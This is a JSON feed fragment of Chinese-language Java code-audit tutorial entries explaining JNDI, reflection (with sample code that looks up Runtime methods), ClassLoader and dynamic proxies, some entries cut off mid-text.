      "summary": "4-JNDI\nJNDI简介\nJNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口（类似JDBC都是构建在抽象层上）。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。\n**命名服务：**将Java...",
      "content_html": "\n<h2>JNDI简介</h2>\n<p><strong>JNDI(Java Naming and Directory Interface)<strong>是一个应用程序设计的API，为开发人员提供了</strong>查找和访问各种命名和目录服务</strong>的通用、统一的接口（类似JDBC都是构建在抽象层上）。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p>\n<p>**命名服务：**将Java对象以某个名称的形式绑定（binding）到一个容器环境（Context）中，以后调用容器环境（Context）的查找（lookup）方法又可以查找出某个名称所绑定的Java对象。简单来说，就是把一个Java对象和一个特定的名称关联在一起，方便容器后续使用。</p>\n<p>**目录服务：**将一个对象的所有属性信息保存到一个容器环境中。JNDI的目录（Directory）原理与JNDI的命名（Naming）原理非常相似，主要的区别在于目录容器环境中保存的是对象的属性信息，而不是对象本身。举个例子，Name的作用是在容器环境中绑定一个Person对象，而Directory的作用是在容器环境中保存这个Person对象的属性，比如说age=10，name=小明等等。实际上，二者往往是结合在一起使用的</p>\n<p><strong>JNDI可访问的现有的目录及服务有：</strong>\nDNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。其中<strong>LDAP、RMI</strong>经常被利用，进行JNDI注入攻击。</p>\n<p><code>JNDI</code>默认支持自动转换的协议：</p>\n<p>| 协议名称             | 协议URL        | Context类                                               |\n|</p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "5-反射",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/5-reflection.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/5-reflection.html",
      "summary": "5-反射\n\nJava-Reflection（JAVA反射）是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够通过Java-Reflection来调用它的任意方法和属性（不管是公共的还是私有的），这种动态获取信息以及动态调用对象方法的行为被称为java的反射机制。\nJava反射机制是Java动态性中最为重要的体现，...",
      "content_html": "\n<blockquote>\n<p>Java-Reflection（JAVA反射）是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够通过Java-Reflection来调用它的任意方法和属性（不管是公共的还是私有的），这种动态获取信息以及动态调用对象方法的行为被称为java的反射机制。</p>\n<p>Java反射机制是Java动态性中最为重要的体现，利用反射机制我们可以轻松的实现Java类的动态调用。Java的大部分框架都是采用了反射机制来实现的(如:<code>Spring MVC</code>、<code>ORM框架</code>等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p>\n</blockquote>\n<blockquote>\n<p>反射的用途很广泛。在开发过程中使用Eclipse、IDEA等开发工具时，当我们输入一个对象或类并想调用它的属性或方法时，编译器会自动列出它的属性或方法，这是通过反射实现的；再如，JavaBean和JSP之间的调用也是通过反射实现的。反射最重要的用途是开发各种通用框架，如上文中提到的Spring框架以及ORM框架，都是通过反射机制来实现的。</p>\n</blockquote>\n<h2>1、反射获取类对象</h2>\n<p>获取类对象的方式有如下四种：</p>\n<ol>\n<li>\n<p><code>Class.forName</code></p>\n<p>如果要使用<code>Class</code>类中的方法获取类对象，就需要使用<code>forName() </code>方法，只要有类名称即可，使用更为方便，扩展性更强。例如在配置JDBC的时候，经常采用这种方法。</p>\n</li>\n<li>\n<p><code>类名.class </code>直接获取</p>\n<p>任何数据类型都具备静态的属性，因此可以使用<code>.class</code>直接获取其对应的Class对象。这种方法相对简单，但要用到类中的静态成员</p>\n</li>\n<li>\n<p><code>类名.getClass </code></p>\n<p>可以通过 <code>Object </code>类中的 <code>getClass() </code>方法来获取字节码对象，不过这种方法较为烦琐，必须要明确具体的类，然后创建对象。</p>\n</li>\n<li>\n<p><code>classLoader.loadClass(\"完整类名\");  </code></p>\n<p>其中<code>classloader</code>需要继承了<code>ClassLoader</code>的类实例化。<code>loadClass() </code>方法与<code>forName()</code>方法类似，只要有类名称即可，区别在于<code>forName()</code>的静态方法 JVM 会装载类，并且执行<code>static()</code>中的代码；而<code>loadClass() </code>不会执行<code>static()</code>中的代码。</p>\n</li>\n</ol>\n<p>以上四种方法的具体实现代码如下：</p>\n<p><strong>ps</strong> 继承<code>ClassLoder</code>是为了第四种方法的name5，其余方法不需要继承</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/7/29 17:50\n * @Description: 获取类对象\n */</span>\n\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">GetClassName</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span>  <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">{</span>\n<span class=\"token comment\">//        1: forname()</span>\n        <span class=\"token class-name\">Class</span> name1 <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.Runtime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        2: .class</span>\n        <span class=\"token class-name\">Class</span> name2 <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        3: getClass()</span>\n        <span class=\"token class-name\">Runtime</span> rt <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span> name3 <span class=\"token operator\">=</span> rt<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        4: loadClass()</span>\n        <span class=\"token class-name\">Class</span> name4 <span class=\"token operator\">=</span> <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSystemClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.Runtime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">GetClassName</span> <span class=\"token class-name\">TestClassLoader</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">GetClassName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span> name5 <span class=\"token operator\">=</span> <span class=\"token class-name\">TestClassLoader</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.Runtime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>执行结果如下：</p>\n<figure><figcaption>image-20230730104124182</figcaption></figure>\n<h2>2、反射获取类方法</h2>\n<p>反射获取类方法的方式：</p>\n<ol>\n<li>\n<p><code>getDeclaredMethods()</code>方法</p>\n<p><code>getDeclaredMethods() </code>方法返回类自身或接口自身声明的所有方法，包括public、protected、private和默认方法，但<strong>不包括继承的方法</strong>。</p>\n</li>\n<li>\n<p><code>getMethods()</code>方法</p>\n<p><code>getMethods()</code>方法返回某个类的所有public方法，<strong>包括其继承类的public方法</strong>。</p>\n</li>\n<li>\n<p><code>getMethod()</code>方法</p>\n<p><code>getMethod() </code>方法只能返回一个特定的方法（如<code>Runtime</code> 类中的<code>exec()</code>方法），该方法的第一个参数为方法名称，后面的参数为方法的参数对应Class的对象。</p>\n</li>\n<li>\n<p><code>getDeclaredMethod()</code>方法。</p>\n<p><code>getDeclaredMethod()</code>方法与<code>getMethod()</code>类似，也只能返回一个特定的方法，参数同上。</p>\n</li>\n</ol>\n<p>具体代码如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/7/29 18:55\n * @Description : 获取类方法\n */</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">GetClassMethod</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NoSuchMethodException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Class</span> name <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.Runtime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        1. getDeclaredMethods()</span>\n        <span class=\"token class-name\">Method</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> declaredMethods <span class=\"token operator\">=</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethods</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDeclaredMethods()方法获取类方法：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Method</span> m<span class=\"token operator\">:</span>declaredMethods<span class=\"token punctuation\">)</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        2. getMethods()</span>\n        <span class=\"token class-name\">Method</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> methods <span class=\"token operator\">=</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">getMethods</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethods()获取类方法：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Method</span> m<span class=\"token operator\">:</span>methods<span class=\"token punctuation\">)</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        3. getMethod()</span>\n        <span class=\"token class-name\">Method</span> method <span class=\"token operator\">=</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod()获取exec方法\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        4. getDeclaredMethod</span>\n        <span class=\"token class-name\">Method</span> declaredMethod <span class=\"token operator\">=</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDeclaredMethod()获取exec方法\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>declaredMethod<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>执行结果：</p>\n<p><code>getDeclaredMethods()</code>方法</p>\n<figure><figcaption>image-20230730104206414</figcaption></figure>\n<p><code>getMethods()</code>方法</p>\n<figure><figcaption>image-20230730104235263</figcaption></figure>\n<figure><figcaption>image-20230730104302183</figcaption></figure>\n<p><code>getDeclaredMethod()</code>方法与<code>getMethod()</code></p>\n<figure><figcaption>image-20230730104316897</figcaption></figure>\n<p><strong>下面对<code>getMethods()</code>与<code>getDeclaredMethods()</code>的区别进行代码验证</strong>，首先明确二者区别：</p>\n<p><code>getMethods()</code>：获取当前类或父类或父接口的 public 修饰的字段（JDK1.8中还包含接口中 default 修饰的方法，因为在JDK1.8环境下，接口中使用 default 修饰的方法，在编译后会变成 public 修饰的，可用反编译进行验证。）</p>\n<p><code>getDeclaredMethods()</code>： 获取当前类的所有方法(包括 protected/默认/private 修饰的方法；不包括父类 、接口 public 修饰的方法)</p>\n<p><strong>1、创建接口和类</strong></p>\n<p>创建一个ReflectInterface接口，里面有3个方法：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">ReflectInterface</span> <span class=\"token punctuation\">{</span>\n    \n\t<span class=\"token keyword\">default</span> <span class=\"token keyword\">void</span> <span class=\"token function\">defaultMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">staticMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token function\">voidMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n</code></pre></div><p>创建一个Parent类，有四种Java权限修饰的方法（以 p**11 格式）：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Parent</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">ParentPublic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">ParentProtected</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token class-name\">ParentVoid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">ParentPrivate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>创建一个Child类，实现ReflectInterface接口，继承Parent 类， 同时有四种Java权限修饰的方法（以 c**22 格式）：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Child</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Parent</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ReflectInterface</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">ChildPublic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">ChildProtected</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token class-name\">ChildVoid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">ChildPrivate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><strong>2、测试类</strong></p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/7/30 10:30\n * @Description : \n */</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>junit<span class=\"token punctuation\">.</span>jupiter<span class=\"token punctuation\">.</span>api<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Test</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestReflect</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Test</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">testGetMethods</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Child</span><span class=\"token punctuation\">&gt;</span></span> childClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Method</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> methods <span class=\"token operator\">=</span> childClass<span class=\"token punctuation\">.</span><span class=\"token function\">getMethods</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"测试getMethods()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Method</span> m<span class=\"token operator\">:</span>methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>\"</code></pre></div>",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "6-ClassLoader类加载机制",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/6-ClassLoader.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/6-ClassLoader.html",
      "summary": "6-ClassLoader类加载机制\nJava程序是由class文件组成的一个完整的应用程序。在程序运行时，并不会一次性加载所有的class文件进入内存，而是通过Java的类加载机制ClassLoader进行动态加载，从而转换成java.lang.Class 类的一个实例。\n1、ClassLoader类\nClassLoader是一个抽象类，主要的功能是...",
      "content_html": "\n<p>Java程序是由class文件组成的一个完整的应用程序。在程序运行时，并不会一次性加载所有的class文件进入内存，而是通过Java的类加载机制<code>ClassLoader</code>进行动态加载，从而转换成<code>java.lang.Class </code>类的一个实例。</p>\n<h2>1、ClassLoader类</h2>\n<p><code>ClassLoader</code>是一个抽象类，主要的功能是通过指定的类的名称，找到或生成对应的字节码，返回一个<code>java.lang.Class </code>类的实例。开发者可以继承<code>ClassLoader</code>类来实现自定义的类加载器。<code>ClassLoader</code>类中加载类相关的方法如表所示。</p>\n<p>| 方法                                                 | 说明                                                         |\n|</p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "7-动态代理",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/7-DynamicProxy.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/7-DynamicProxy.html",
      "summary": "7-动态代理\n代理是 Java中的一种设计模式，主要用于提供对目标对象另外的访问方式，即通过代理对象访问目标对象。这样，就可以在目标对象实现的基础上，加强额外的功能操作，实现扩展目标对象的功能。代理模式的关键点在于代理对象和目标对象，代理对象是对目标对象的扩展，并且代理对象会调用目标对象。Java 代理的方式有3种：静态代理、动态代理和CGLib代理。...",
      "content_html": "\n<p>代理是 Java中的一种设计模式，主要用于提供对目标对象另外的访问方式，即通过代理对象访问目标对象。这样，就可以在目标对象实现的基础上，加强额外的功能操作，实现扩展目标对象的功能。代理模式的关键点在于代理对象和目标对象，代理对象是对目标对象的扩展，并且代理对象会调用目标对象。Java 代理的方式有3种：静态代理、动态代理和CGLib代理。</p>\n<h2>1、静态代理</h2>\n<p>所谓静态代理，顾名思义，当确定代理对象和被代理对象后，就无法再去代理另一个对象。同理，在 Java 静态代理中，如果我们想要实现另一个代理，就需要重新写一个代理对象，其原理如图</p>\n<figure><figcaption>img</figcaption></figure>\n<p>总而言之，在静态代理中，代理类和被代理类实现了同样的接口，代理类同时持有被代理类的引用。当我们需要调用被代理类的方法时，可以通过调用代理类的方法实现，静态代理的实现：</p>\n<figure><figcaption>img</figcaption></figure>\n<h2>2、动态代理</h2>\n<p><strong>静态代理的优势</strong>：允许开发人员在不修改已有代码的前提下完成一些增强功能的需求。</p>\n<p><strong>静态代理的缺点</strong>：</p>\n<ol>\n<li>静态代理的使用会由于代理对象要实现与目标对象一致的接口，从而产生过多的代理类，造成冗余；</li>\n<li>大量使用静态代理会使项目不易维护，一旦接口增加方法，目标对象与代理对象就要进行修改。</li>\n</ol>\n<p><strong>动态代理的优势</strong>：可以很方便地对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。</p>\n<p>实际上，Java 中的“动态”也就意味着使用了反射，因此动态代理其实是基于反射机制的一种代理模式。</p>\n<p><strong>动态代理与静态代理的区别</strong>：通过动态代理可以实现多个需求。动态代理其实是通过实现接口的方式来实现代理，具体来说，动态代理是通过<code>Proxy</code>类创建代理对象，然后将接口方法“代理”给<code>InvocationHandler</code> 接口完成的。</p>\n<figure><figcaption>img</figcaption></figure>\n<p>动态代理的关键有两个，即上文中提到的<code>Proxy </code>类以及<code>InvocationHandler</code>接口。</p>\n<h3>2.1、Proxy类</h3>\n<p>在JDK中，Java提供了<code>Java.lang.reflect.InvocationHandler</code>接口和<code>Java.lang. reflect.Proxy</code>类，这两个类相互配合，其中Proxy类是入口。<code>Proxy</code>类是用来创建一个代理对象的类，它提供了很多方法。</p>\n<p><code>static Invocation Handler get Invocation Handler (Object proxy) </code>：该方法主要用于获取指定代理对象所关联的调用程序。</p>\n<p><code>static Class&lt;?&gt; getProxyClass (ClassLoader loader, Class&lt;?&gt;... interfaces) </code>：该方法主要用于返回指定接口的代理类。</p>\n<p><code>static Object newProxyInstance (ClassLoader loader, Class&lt;?&gt;[] interfaces, Invocation Handler h)</code>：该方法主要返回一个指定接口的代理类实例，该接口可以将方法调用指派到指定的调用处理程序。</p>\n<p><code>static boolean isProxyClass (Class&lt;?&gt; cl)</code>：当且仅当指定的类通过 <code>getProxyClass</code> 方法或 <code>newProxyInstance </code>方法动态生成为代理类时，返回 <code>true</code>。该方法的可靠性对于使用它做出安全决策而言非常重要，所以它的实现不应仅测试相关的类是否可以扩展Proxy。</p>\n<p>在上述方法中，<strong>最常用的是<code>newProxyInstance</code>方法</strong>，该方法的作用是创建一个代理类对象，它接收3个参数：<code>loader</code>、<code>interfaces</code>以及<code>h</code>，各个参数含义如下：</p>\n<p><code>loader</code>：这是一个<code>ClassLoader</code>对象，定义了由哪个<code>ClassLoader</code>对象对生成的代理类进行加载。</p>\n<p><code>interfaces</code>：这是代理类要实现的接口列表，表示用户将要给代理对象提供的接口信息。如果提供了这样一个接口对象数组，就是声明代理类实现了这些接口，代理类即可调用接口中声明的所有方法。</p>\n<p><code>h</code>：这是指派方法调用的调用处理程序，是一个<code>InvocationHandler</code>对象，表示当动态代理对象调用方法时会关联到哪一个<code>InvocationHandler</code>对象上，并最终由其调用。</p>\n<h3>2.2、InvocationHandler接口</h3>\n<p><code>Java.lang.reflect InvocationHandler</code>，主要方法为<code>Object invoke（Object proxy, Method method,Object[] args）</code>，该方法定义了代理对象调用方法时希望执行的动作，用于集中处理在动态代理类对象上的方法调用。<code>Invoke</code> 